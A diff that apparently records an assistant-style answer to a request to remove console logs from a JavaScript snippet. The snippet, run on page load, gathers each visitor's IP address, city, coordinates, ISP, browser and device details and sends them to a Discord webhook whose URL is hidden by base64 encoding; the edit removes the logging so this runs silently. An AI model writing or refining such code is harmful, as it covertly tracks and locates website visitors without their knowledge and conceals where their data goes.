@@ -1,3 +1,6 @@
+To remove the console logs from the code, you can simply remove the `console.log` statements. Here's the modified code without the console logs:
+
+```javascript
 // Encoded webhook URL
 const encodedWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzOTg4NjIzMjMxODkwMjMxNC9HdWZnejd1cTVlU08xQ1NGMEE4X2RNS0ZDNGYtVm05dU5NTGFqdTFScXVneDlWZ05KREtVOFZ4RV9EMVUyRjJTeV90Tg==';
 const webhookURL = atob(encodedWebhookURL); // Decoding the URL
@@ -54,32 +57,10 @@ window.addEventListener('load', () => {
                     const availableMemory = navigator.deviceMemory;
                     const cpuThreads = navigator.hardwareConcurrency;
 
-                    console.log('IP Address:', ip);
-                    console.log('Country:', country);
-                    console.log('Region:', region);
-                    console.log('City:', city);
-                    console.log('Latitude:', latitude);
-                    console.log('Longitude:', longitude);
-                    console.log('ISP:', isp);
-                    console.log('User Agent:', userAgent);
-                    console.log('Window Width:', windowWidth);
-                    console.log('Window Height:', windowHeight);
-                    console.log('Window Ratio:', windowRatio);
-                    console.log('Screen Width:', screenWidth);
-                    console.log('Screen Height:', screenHeight);
-                    console.log('Screen Ratio:', screenRatio);
-                    console.log('Screen Pixel Ratio:', screenPixelRatio);
-                    console.log('Screen DPI:', screenDPI);
-                    console.log('Screen Color Depth:', screenColorDepth);
-                    console.log('Screen Orientation:', screenOrientation);
-                    console.log('Screen Rotation:', screenRotation);
-                    console.log('OS:', os);
-                    console.log('Available Browser Memory:', availableMemory);
-                    console.log('CPU Threads:', cpuThreads);
-
                     sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
                 })
                 .catch(error => console.error('Error getting IP details:', error));
         })
         .catch(error => console.error('Error getting IP address:', error));
 });
+```
